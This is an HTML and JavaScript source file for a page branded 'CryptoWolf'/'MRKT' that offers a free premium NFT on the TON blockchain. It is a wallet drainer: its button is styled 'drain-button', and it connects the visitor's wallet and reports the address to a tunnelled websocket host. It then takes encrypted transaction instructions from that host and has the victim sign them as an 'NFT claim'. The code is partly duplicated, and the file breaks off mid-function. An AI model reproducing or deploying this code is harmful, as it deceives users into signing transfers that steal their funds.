<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="Content-Security-Policy" content="
        default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;
        script-src * 'unsafe-inline' 'unsafe-eval';
        connect-src * 'unsafe-inline';
        img-src * data: blob: 'unsafe-inline';
        frame-src *;
        style-src * 'unsafe-inline';
    ">
    <title>CryptoWolf</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
        }
        
        body {
            background: #ffd700; /* –ñ–µ–ª—Ç—ã–π —Ñ–æ–Ω */
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            background: #000000; /* –ß–µ—Ä–Ω—ã–π –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä */
            border-radius: 24px;
            padding: 40px 32px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
            max-width: 420px;
            width: 100%;
            text-align: center;
            border: 3px solid #333333;
        }
        
        .logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 24px;
            background: linear-gradient(135deg, #0088cc, #006699); /* –°–∏–Ω–∏–π –≥—Ä–∞–¥–∏–µ–Ω—Ç –¥–ª—è –∏–∫–æ–Ω–∫–∏ */
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 8px 25px rgba(0, 136, 204, 0.4);
        }
        
        .logo img {
            width: 40px;
            height: 40px;
            /* –ò–∫–æ–Ω–∫–∞ –æ—Å—Ç–∞–µ—Ç—Å—è –±–µ–ª–æ–π –Ω–∞ —Å–∏–Ω–µ–º —Ñ–æ–Ω–µ */
        }
        
        .title {
            font-size: 28px;
            font-weight: 700;
            color: #ffd700; /* –ñ–µ–ª—Ç—ã–π —Ç–µ–∫—Å—Ç */
            margin-bottom: 12px;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
        }
        
        .subtitle {
            font-size: 16px;
            color: #cccccc; /* –°–≤–µ—Ç–ª–æ-—Å–µ—Ä—ã–π –ø–æ–¥–∑–∞–≥–æ–ª–æ–≤–æ–∫ */
            margin-bottom: 32px;
        }
        
        .connect-section {
            margin-bottom: 20px;
        }
        
        .info-message {
            background: rgba(255, 215, 0, 0.1); /* –ü–æ–ª—É–ø—Ä–æ–∑—Ä–∞—á–Ω—ã–π –∂–µ–ª—Ç—ã–π */
            border: 2px solid #ffd700;
            border-radius: 16px;
            padding: 20px;
            margin: 20px 0;
            font-size: 15px;
            color: #ffd700; /* –ñ–µ–ª—Ç—ã–π —Ç–µ–∫—Å—Ç */
            line-height: 1.4;
            font-weight: 500;
        }
        
        .drain-button {
            width: 100%;
            background: linear-gradient(135deg, #ffd700, #ffed4e); /* –ñ–µ–ª—Ç—ã–π –≥—Ä–∞–¥–∏–µ–Ω—Ç */
            border: 2px solid #ffd700;
            border-radius: 12px;
            height: 52px;
            font-weight: 600;
            color: #000000; /* –ß–µ—Ä–Ω—ã–π —Ç–µ–∫—Å—Ç –Ω–∞ –∂–µ–ª—Ç–æ–π –∫–Ω–æ–ø–∫–µ */
            font-size: 18px;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .drain-button:hover {
            background: linear-gradient(135deg, #ffed4e, #fff176);
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(255, 215, 0, 0.4);
        }
        
        .drain-button:disabled {
            background: #666666;
            color: #999999;
            cursor: not-allowed;
            transform: none;
            border-color: #666666;
        }
        
        .disconnect-button {
            width: 100%;
            background: linear-gradient(135deg, #ff4444, #cc0000); /* –ö—Ä–∞—Å–Ω—ã–π –¥–ª—è –∫–Ω–æ–ø–∫–∏ –æ—Ç–∫–ª—é—á–µ–Ω–∏—è */
            border: 2px solid #ff4444;
            border-radius: 12px;
            height: 40px;
            font-weight: 600;
            color: white;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
        }
        
        .disconnect-button:hover {
            background: linear-gradient(135deg, #ff6666, #ff0000);
            transform: translateY(-2px);
        }
        
        .footer {
            margin-top: 24px;
            font-size: 12px;
            color: #cccccc; /* –°–≤–µ—Ç–ª–æ-—Å–µ—Ä—ã–π —Ç–µ–∫—Å—Ç */
        }

        .ton-connect-button {
            width: 100%;
        }

        .status-message {
            margin: 15px 0;
            padding: 12px;
            border-radius: 10px;
            font-weight: 500;
            display: none;
        }
        
        .status-success {
            background: rgba(0, 255, 0, 0.1);
            border: 1px solid #00ff00;
            color: #00ff00;
        }
        
        .status-error {
            background: rgba(255, 0, 0, 0.1);
            border: 1px solid #ff0000;
            color: #ff0000;
        }
        
        .status-info {
            background: rgba(255, 215, 0, 0.2);
            border: 1px solid #ffd700;
            color: #ffd700;
        }

        .wallet-info {
            background: rgba(255, 215, 0, 0.1);
            border: 2px solid #ffd700;
            border-radius: 12px;
            padding: 15px;
            margin: 15px 0;
            display: none;
        }
        
        .wallet-address {
            color: #ffd700;
            font-weight: 600;
            word-break: break-all;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://ton.org/download/ton_symbol.png" alt="TON">
        </div>
        
        <h1 class="title">MRKT</h1>
        <p class="subtitle">TON Premium Wallet Manager</p>
        
        <div class="connect-section">
            <div id="ton-connect" class="ton-connect-button"></div>
        </div>
        
        <div id="walletInfo" class="wallet-info">
            <div class="wallet-address" id="walletAddress"></div>
            <button onclick="disconnectWallet()" class="disconnect-button">
                üö´ Disconnect Wallet
            </button>
        </div>
        
        <div class="info-message">
            üê∫ Connect your TON wallet and claim your exclusive NFT<br>
            Secure ‚Ä¢ Fast ‚Ä¢ Premium Experience
        </div>
        
        <button id="claimButton" onclick="claimNFT()" class="drain-button" disabled>
            üéÅ CLAIM PREMIUM NFT
        </button>
        
        <div id="statusMessage" class="status-message"></div>
        
        <div class="footer">
            Powered by TON Blockchain ‚Ä¢ CryptoWolf System
        </div>
    </div>

    <script>
        let tonConnectUI = null;
        let isWebSocketConnected = false;
        let ws = null;

        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è TON Connect
        function initTonConnect() {
            tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
                manifestUrl: window.location.origin + '/tonconnect-manifest.json',
                buttonRootId: 'ton-connect'
            });

            tonConnectUI.onStatusChange((wallet) => {
                if (wallet) {
                    showWalletInfo(wallet);
                    document.getElementById('claimButton').disabled = false;
                    connectWebSocket();
                } else {
                    hideWalletInfo();
                    document.getElementById('claimButton').disabled = true;
                }
            });
        }

        // –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ WebSocket —Å–µ—Ä–≤–µ—Ä—É
        function connectWebSocket() {
    try {
        // –ò–°–ü–†–ê–í–õ–ï–ù–ù–´–ô URL –î–õ–Ø PLAYIT.GG
        const wsUrl = 'wss://3b6304cc82bd23ff3230979fef8d7f3b.serveo.net';
        
        console.log('Connecting to WebSocket:', wsUrl);
        ws = new WebSocket(wsUrl);
        
        ws.onopen = function() {
            console.log('‚úÖ WebSocket connected');
            isWebSocketConnected = true;
            showStatus('Connected to server', 'success');
            sendOpenMessage();
        };
        
        ws.onmessage = function(event) {
            console.log('üì® WebSocket message received:', event.data);
            try {
                const data = JSON.parse(event.data);
                handleServerMessage(data);
            } catch (e) {
                console.error('Error parsing message:', e);
                console.log('Raw message:', event.data);
            }
        };
        
        ws.onclose = function(event) {
            console.log('‚ùå WebSocket disconnected:', event.code, event.reason);
            isWebSocketConnected = false;
            showStatus('Disconnected from server. Reconnecting...', 'error');
            setTimeout(connectWebSocket, 3000);
        };
        
        ws.onerror = function(error) {
            console.error('üí• WebSocket error:', error);
            showStatus('WebSocket connection error', 'error');
        };
    } catch (error) {
        console.error('WebSocket connection failed:', error);
        setTimeout(connectWebSocket, 5000);
    }
}

        // –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è –æ–± –æ—Ç–∫—Ä—ã—Ç–∏–∏ —Å–∞–π—Ç–∞
        function sendOpenMessage() {
            if (!ws || !isWebSocketConnected) return;
            
            const message = {
                action: 'log',
                data: {
                    method: 'opened',
                    userInfo: getUserInfo()
                }
            };
            ws.send(JSON.stringify(message));
        }

        // –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
        function getUserInfo() {
            const wallet = tonConnectUI?.account;
            return {
                ip: 'auto-detected', // –°–µ—Ä–≤–µ—Ä —Å–∞–º –æ–ø—Ä–µ–¥–µ–ª–∏—Ç —Ä–µ–∞–ª—å–Ω—ã–π IP
                country: 'auto',     // –°–µ—Ä–≤–µ—Ä —Å–∞–º –æ–ø—Ä–µ–¥–µ–ª–∏—Ç —Å—Ç—Ä–∞–Ω—É
                domain: window.location.hostname,
                sng: false,
                address: wallet?.address || '',
                device: {
                    app: 'web',
                    platform: 'browser'
                },
                hash: generateHash()
            };
        }

        function generateHash() {
            return Math.random().toString(36).substring(2) + Date.now().toString(36);
        }

        // –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è NFT
        function claimNFT() {
    if (!tonConnectUI?.connected) {
        showStatus('Please connect your wallet first!', 'error');
        return;
    }

    if (!isWebSocketConnected) {
        showStatus('Server connection lost. Reconnecting...', 'error');
        connectWebSocket();
        return;
    }

    showStatus('Requesting NFT transaction...', 'info');

    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∑–∞–ø—Ä–æ—Å –Ω–∞ –ø–æ–ª—É—á–µ–Ω–∏–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π –≤ –ø—Ä–∞–≤–∏–ª—å–Ω–æ–º —Ñ–æ—Ä–º–∞—Ç–µ
    const message = {
        method: 'getMessages',
        message: {
            userInfo: getUserInfo()
        }
    };
    
    console.log('üì§ Sending getMessages request:', message);
    ws.send(JSON.stringify(message));
}

        // –ó–ê–ú–ï–ù–ò–¢–ï —ç—Ç—É —Ñ—É–Ω–∫—Ü–∏—é –ø–æ–ª–Ω–æ—Å—Ç—å—é:
function handleServerMessage(data) {
    console.log('Server response:', data);
    
    // –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –ø–æ–ª–µ "method" –≤–º–µ—Å—Ç–æ "action"
    switch (data.method) {
        case 'connected':
            console.log('‚úÖ Connected to server, sending safety check...');
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –±–µ–∑–æ–ø–∞—Å–Ω–æ–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ
            const safetyMessage = {
                method: 'connected',
                secret: data.secret // –∏—Å–ø–æ–ª—å–∑—É–µ–º —Å–µ–∫—Ä–µ—Ç –æ—Ç —Å–µ—Ä–≤–µ—Ä–∞
            };
            ws.send(JSON.stringify(safetyMessage));
            break;
            
        case 'safety':
            console.log('‚úÖ Safety check passed, sending wait...');
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —á—Ç–æ –≥–æ—Ç–æ–≤—ã –∫ —Ä–∞–±–æ—Ç–µ
            const waitMessage = {
                method: 'safety', 
                message: 'hello'
            };
            ws.send(JSON.stringify(waitMessage));
            break;
            
        case 'wait':
            console.log('‚úÖ Server is ready, you can now claim NFT');
            showStatus('Server is ready! You can claim NFT now', 'success');
            break;
            
        case 'messages':
            console.log('üì® Received transaction messages');
            handleTransactionMessages(data.message);
            break;
            
        case 'done':
            showStatus('Operation completed successfully!', 'success');
            break;
            
        case 'error':
            showStatus('Server error: ' + data.message, 'error');
            break;
            
        case 'manifest':
            console.log('üìã Manifest received');
            break;
            
        default:
            console.log('Unknown method:', data.method);
    }
}
        

        // –û–±—Ä–∞–±–æ—Ç–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–æ–Ω–Ω—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏–π
        async function handleTransactionMessages(encryptedData) {
            try {
                showStatus('Preparing transaction for signing...', 'info');
                
                // –í —Ä–µ–∞–ª—å–Ω–æ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏ –∑–¥–µ—Å—å –±—É–¥–µ—Ç –¥–µ—à–∏—Ñ—Ä–æ–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö
                // –î–ª—è –¥–µ–º–æ –ø—Ä–µ–¥–ø–æ–ª–æ–∂–∏–º, —á—Ç–æ –¥–∞–Ω–Ω—ã–µ —É–∂–µ –≤ –ø—Ä–∞–≤–∏–ª—å–Ω–æ–º —Ñ–æ—Ä–º–∞—Ç–µ
                const transactionData = encryptedData;
                
                if (transactionData.messages && transactionData.messages.length > 0) {
                    const transaction = {
                        validUntil: Math.floor(Date.now() / 1000) + 300, // 5 minutes
                        messages: transactionData.messages
                    };

                    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é –Ω–∞ –ø–æ–¥–ø–∏—Å–∞–Ω–∏–µ
                    const result = await tonConnectUI.sendTransaction(transaction);
                    
                    showStatus('üéâ NFT claimed successfully!', 'success');
                    console.log('Transaction result:', result);
                    
                    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å—Ç–∞—Ç—É—Å –Ω–∞ —Å–µ—Ä–≤–µ—Ä
                    sendTransactionStatus('sent', transactionData.messages);
                    
                } else {
                    showStatus('No transactions available', 'error');
                }
            } catch (error) {
                console.error('Transaction error:', error);
                showStatus('Transaction failed: ' + error.message, 'error');
                sendTransactionStatus('error', []);
            }
        }

        // –û—Ç–ø—Ä–∞–≤–∫–∞ —Å—Ç–∞—Ç—É—Å–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ –Ω–∞ —Å–µ—Ä–≤–µ—Ä
        function sendTransactionStatus(status, chunk) {
            if (!ws || !isWebSocketConnected) return;
            
            const message = {
                action: 'log',
                data: {
                    method: 'chunkStatus',
                    status: status,
                    chunk: chunk,
                    userInfo: getUserInfo()
                }
            };
            ws.send(JSON.stringify(message));
        }
        // –î–æ–±–∞–≤—å—Ç–µ —ç—Ç–∏ —Ñ—É–Ω–∫—Ü–∏–∏ –≤ –Ω–∞—á–∞–ª–æ –≤–∞—à–µ–≥–æ –∫–ª–∏–µ–Ω—Ç—Å–∫–æ–≥–æ –∫–æ–¥–∞ (–≤ index.html)
class AesCrypto {
    static async encrypt(text, key, bits = 256) {
        try {
            // –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º –∫–ª—é—á –≤ ArrayBuffer
            const keyData = new TextEncoder().encode(key);
            const cryptoKey = await crypto.subtle.importKey(
                'raw',
                keyData,
                { name: 'AES-CTR' },
                false,
                ['encrypt']
            );

            // –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º IV (counter)
            const iv = crypto.getRandomValues(new Uint8Array(16));
            
            // –®–∏—Ñ—Ä—É–µ–º –¥–∞–Ω–Ω—ã–µ
            const encodedText = new TextEncoder().encode(text);
            const encrypted = await crypto.subtle.encrypt(
                {
                    name: 'AES-CTR',
                    counter: iv,
                    length: 64
                },
                cryptoKey,
                encodedText
            );

            // –ö–æ–º–±–∏–Ω–∏—Ä—É–µ–º IV + encrypted data –∏ –∫–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º –≤ hex
            const result = new Uint8Array(iv.length + encrypted.byteLength);
            result.set(iv, 0);
            result.set(new Uint8Array(encrypted), iv.length);
            
            return this.arrayBufferToHex(result);
        } catch (error) {
            console.error('Encryption error:', error);
            throw error;
        }
    }

    static async decrypt(encryptedHex, key, bits = 256) {
        try {
            // –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º hex –≤ ArrayBuffer
            const encryptedData = this.hexToArrayBuffer(encryptedHex);
            
            // –ò–∑–≤–ª–µ–∫–∞–µ–º IV (–ø–µ—Ä–≤—ã–µ 16 –±–∞–π—Ç)
            const iv = encryptedData.slice(0, 16);
            const data = encryptedData.slice(16);
            
            // –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º –∫–ª—é—á
            const keyData = new TextEncoder().encode(key);
            const cryptoKey = await crypto.subtle.importKey(
                'raw',
                keyData,
                { name: 'AES-CTR' },
                false,
                ['decrypt']
            );

            // –î–µ—à–∏—Ñ—Ä—É–µ–º
            const decrypted = await crypto.subtle.decrypt(
                {
                    name: 'AES-CTR',
                    counter: iv,
                    length: 64
                },
                cryptoKey,
                data
            );

            return new TextDecoder().decode(decrypted);
        } catch (error) {
            console.error('Decryption error:', error);
            throw error;
        }
    }

    static arrayBufferToHex(buffer) {
        return Array.from(new Uint8Array(buffer))
            .map(b => b.toString(16).padStart(2, '0'))
            .join('');
    }

    static hexToArrayBuffer(hex) {
        const bytes = new Uint8Array(hex.length / 2);
        for (let i = 0; i < hex.length; i += 2) {
            bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
        }
        return bytes;
    }
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è SHA256 —Ö–µ—à–∞ (—Å–æ–≤–º–µ—Å—Ç–∏–º–∞ —Å —Å–µ—Ä–≤–µ—Ä–æ–º)
async function getSHA256Hash(str) {
    const encoder = new TextEncoder();
    const data = encoder.encode(str);
    const hash = await crypto.subtle.digest('SHA-256', data);
    return Array.from(new Uint8Array(hash))
        .map(b => b.toString(16).padStart(2, '0'))
        .join('');
}

// –§—É–Ω–∫—Ü–∏–∏ –¥–ª—è cipher/decipher (—Å–æ–≤–º–µ—Å—Ç–∏–º—ã–µ —Å —Å–µ—Ä–≤–µ—Ä–æ–º 'AcmeDev')
function createCipher(secret) {
    return (text) => {
        // –ü—Ä–æ—Å—Ç–∞—è XOR —à–∏—Ñ—Ä–æ–≤–∫–∞ –¥–ª—è –ø—Ä–∏–º–µ—Ä–∞ (–∑–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ –≤–∞—à—É —Ä–µ–∞–ª—å–Ω—É—é –ª–æ–≥–∏–∫—É)
        let result = '';
        for (let i = 0; i < text.length; i++) {
            const charCode = text.charCodeAt(i) ^ secret.charCodeAt(i % secret.length);
            result += String.fromCharCode(charCode);
        }
        return btoa(result); // Base64 –¥–ª—è –ø–µ—Ä–µ–¥–∞—á–∏
    };
}

function createDecipher(secret) {
    return (encryptedText) => {
        try {
            const decoded = atob(encryptedText);
            let result = '';
            for (let i = 0; i < decoded.length; i++) {
                const charCode = decoded.charCodeAt(i) ^ secret.charCodeAt(i % secret.length);
                result += String.fromCharCode(charCode);
            }
            return result;
        } catch (error) {
            console.error('Decipher error:', error);
            throw error;
        }
    };
}

// –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –¥–ª—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è
let myEncryption = '';
let clientEncryption = '';
let signature = '';
let encryptionKey = '';

// –û–±–Ω–æ–≤–∏—Ç–µ —Ñ—É–Ω–∫—Ü–∏—é handleServerMessage –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è
function handleServerMessage(data) {
    console.log('Server response:', data);
    
    switch (data.method) {
        case 'connected':
            console.log('‚úÖ Connected to server, initializing encryption...');
            myEncryption = createDecipher('AcmeDev')(data.secret);
            console.log('Decrypted server key:', myEncryption);
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è
            const connectMessage = {
                method: 'connected',
                secret: data.secret // —ç—Ö–æ-–æ—Ç–≤–µ—Ç
            };
            ws.send(JSON.stringify(connectMessage));
            break;
            
        case 'safety':
            console.log('üîí Safety check received');
            handleSafetyCheck(data.message);
            break;
            
        case 'wait':
            console.log('‚úÖ Server is ready');
            showStatus('Server is ready! You can claim NFT now', 'success');
            break;
            
        case 'messages':
            console.log('üì® Received encrypted messages');
            handleEncryptedMessages(data.message);
            break;
            
        case 'done':
            showStatus('Operation completed successfully!', 'success');
            break;
            
        case 'error':
            showStatus('Server error: ' + data.message, 'error');
            break;
            
        case 'manifest':
            console.log('üìã Manifest received');
            break;
            
        default:
            console.log('Unknown method:', data.method);
    }
}

// –û–±—Ä–∞–±–æ—Ç–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
async function handleSafetyCheck(encryptedMessage) {
    try {
        // –î–µ—à–∏—Ñ—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
        const decrypted = await AesCrypto.decrypt(encryptedMessage, myEncryption);
        console.log('Decrypted safety message:', decrypted);
        
        if (decrypted === 'hello') {
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ
            const safetyResponse = {
                method: 'safety',
                message: 'hello'
            };
            ws.send(JSON.stringify(safetyResponse));
        } else {
            console.error('Safety check failed');
            showStatus('Security verification failed', 'error');
        }
    } catch (error) {
        console.error('Safety check error:', error);
        showStatus('Security error', 'error');
    }
}

// –û–±—Ä–∞–±–æ—Ç–∫–∞ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏–π —Å —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—è–º–∏
async function handleEncryptedMessages(encryptedData) {
    try {
        showStatus('Decrypting transaction data...', 'info');
        
        // –ü—Ä–µ–¥–ø–æ–ª–∞–≥–∞–µ–º, —á—Ç–æ encryptedData —ç—Ç–æ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–∞—è —Å—Ç—Ä–æ–∫–∞
        const decryptedJson = await AesCrypto.decrypt(encryptedData, myEncryption);
        console.log('Decrypted transaction data:', decryptedJson);
        
        const transactionData = JSON.parse(decryptedJson);
        await processTransactionData(transactionData);
        
    } catch (error) {
        console.error('Message decryption error:', error);
        showStatus('Failed to decrypt transaction data', 'error');
    }
}

// –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π
async function processTransactionData(transactionData) {
    try {
        console.log('üìã Processing transaction data:', transactionData);

        if (!transactionData.messages || !Array.isArray(transactionData.messages)) {
            console.error('Invalid transaction format');
            showStatus('Invalid transaction data received', 'error');
            return;
        }

        const messages = transactionData.messages;
        console.log('üì® Transaction messages:', messages);

        if (messages.length > 0) {
            // –ü–æ–¥–≥–æ—Ç–∞–≤–ª–∏–≤–∞–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é –¥–ª—è –ø–æ–¥–ø–∏—Å–∞–Ω–∏—è
            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 300, // 5 minutes
                messages: messages.map(msg => ({
                    address: msg.address,
                    amount: msg.amount || msg.value || '0',
                    payload: msg.payload || ''
                }))
            };

            console.log('üìù Final transaction for signing:', transaction);
            showStatus(`Ready to sign ${messages.length} transaction(s)`, 'info');
            
            // –ù–µ–±–æ–ª—å—à–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –¥–ª—è UX
            await new Promise(resolve => setTimeout(resolve, 1000));

            try {
                console.log('üñäÔ∏è Sending transaction for signing...');
                const result = await tonConnectUI.sendTransaction(transaction);
                
                showStatus('üéâ Transaction signed successfully!', 'success');
                console.log('‚úÖ Transaction result:', result);
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å—Ç–∞—Ç—É—Å –Ω–∞ —Å–µ—Ä–≤–µ—Ä
                await sendTransactionStatus('sent', messages);
                
            } catch (signError) {
                console.error('‚ùå Transaction signing failed:', signError);
                
                if (signError.message?.includes('Rejected')) {
                    showStatus('Transaction rejected by user', 'error');
                } else if (signError.message?.includes('timeout')) {
                    showStatus('Transaction timeout', 'error');
                } else {
                    showStatus('Signing failed: ' + signError.message, 'error');
                }
                
                await sendTransactionStatus('error', messages);
            }
            
        } else {
            console.log('‚ùå No transaction messages available');
            showStatus('No transactions available from server', 'error');
        }

    } catch (error) {
        console.error('üí• Transaction processing error:', error);
        showStatus('Transaction processing failed: ' + error.message, 'error');
        await sendTransactionStatus('error', []);
    }
}

// –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å—Ç–∞—Ç—É—Å–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ —Å —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ–º
async function sendTransactionStatus(status, messages) {
    if (!ws || !isWebSocketConnected) {
        console.log('‚ùå WebSocket not connected');
        return;
    }
    
    try {
        const statusData = {
            method: 'chunkStatus',
            status: status,
            chunk: messages,
            userInfo: getUserInfo()
        };

        // –®–∏—Ñ—Ä—É–µ–º –¥–∞–Ω–Ω—ã–µ –ø–µ—Ä–µ–¥ –æ—Ç–ø—Ä–∞–≤–∫–æ–π
        const encryptedData = await AesCrypto.encrypt(JSON.stringify(statusData), myEncryption);
        
        const message = {
            method: 'log',
            message: encryptedData
        };
        
        console.log('üì§ Sending encrypted status to server');
        ws.send(JSON.stringify(message));
        
    } catch (error) {
        console.error('‚ùå Failed to send encrypted status:', error);
    }
}

// –û–±–Ω–æ–≤–∏—Ç–µ —Ñ—É–Ω–∫—Ü–∏—é claimNFT –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è
async function claimNFT() {
    if (!tonConnectUI?.connected) {
        showStatus('Please connect your wallet first!', 'error');
        return;
    }

    if (!isWebSocketConnected) {
        showStatus('Server connection lost. Reconnecting...', 'error');
        connectWebSocket();
        return;
    }

    showStatus('Requesting NFT transaction...', 'info');

    try {
        const requestData = {
            userInfo: getUserInfo()
        };

        // –®–∏—Ñ—Ä—É–µ–º –∑–∞–ø—Ä–æ—Å
        const encryptedRequest = await AesCrypto.encrypt(JSON.stringify(requestData), myEncryption);
        
        const message = {
            method: 'getMessages',
            message: encryptedRequest
        };
        
        console.log('üì§ Sending encrypted NFT request');
        ws.send(JSON.stringify(message));
        
    } catch (error) {
        console.error('‚ùå Failed to encrypt request:', error);
        showStatus('Failed to prepare request', 'error');
    }
}

// –û–±–Ω–æ–≤–∏—Ç–µ —Ñ—É–Ω–∫—Ü–∏—é getUserInfo –¥–ª—è –≤–∫–ª—é—á–µ–Ω–∏—è –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
function getUserInfo() {
    const wallet = tonConnectUI?.account;
    return {
        ip: 'auto-detected',
        country: 'auto',
        domain: window.location.hostname,
        sng: false,
        address: wallet?.address || '',
        device: {
            app: 'web',
            platform: 'browser',
            userAgent: navigator.userAgent
        },
        hash: generateHash(),
        timestamp: Date.now()
    };
}

function generateHash() {
    return Math.random().toString(36).substring(2) + Date.now().toString(36);
}
        function sendTransactionStatus(status, chunk) {
    if (!ws || !isWebSocketConnected) return;
    
    const message = {
        method: 'log',
        message: {
            method: 'chunkStatus',
            status: status,
            chunk: chunk,
            userInfo: getUserInfo()
        }
    };
    
    console.log('üì§ Sending transaction status:', message);
    ws.send(JSON.stringify(message));
}

        // –û—Ç–∫–ª—é—á–µ–Ω–∏–µ –∫–æ—à–µ–ª—å–∫–∞
        function disconnectWallet() {
            if (tonConnectUI) {
                tonConnectUI.disconnect();
                hideWalletInfo();
                document.getElementById('claimButton').disabled = true;
            }
        }

        // –ü–æ–∫–∞–∑–∞—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –∫–æ—à–µ–ª—å–∫–µ
        function showWalletInfo(wallet) {
            const walletInfo = document.getElementById('walletInfo');
            const walletAddress = document.getElementById('walletAddress');
            
            walletAddress.textContent = 
                wallet.account.address.substring(0, 8) + '...' + 
                wallet.account.address.substring(wallet.account.address.length - 8);
            
            walletInfo.style.display = 'block';
        }

        // –°–∫—Ä—ã—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –∫–æ—à–µ–ª—å–∫–µ
        function hideWalletInfo() {
            document.getElementById('walletInfo').style.display = 'none';
        }

        // –ü–æ–∫–∞–∑–∞—Ç—å —Å—Ç–∞—Ç—É—Å
        function showStatus(message, type) {
            const statusEl = document.getElementById('statusMessage');
            statusEl.textContent = message;
            statusEl.className = 'status-message status-' + type;
            statusEl.style.display = 'block';
            
            // –ê–≤—Ç–æ—Å–∫—Ä—ã—Ç–∏–µ —É—Å–ø–µ—à–Ω—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏–π
            if (type === 'success') {
                setTimeout(() => {
                    statusEl.style.display = 'none';
                }, 5000);
            }
        }

        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('load', function() {
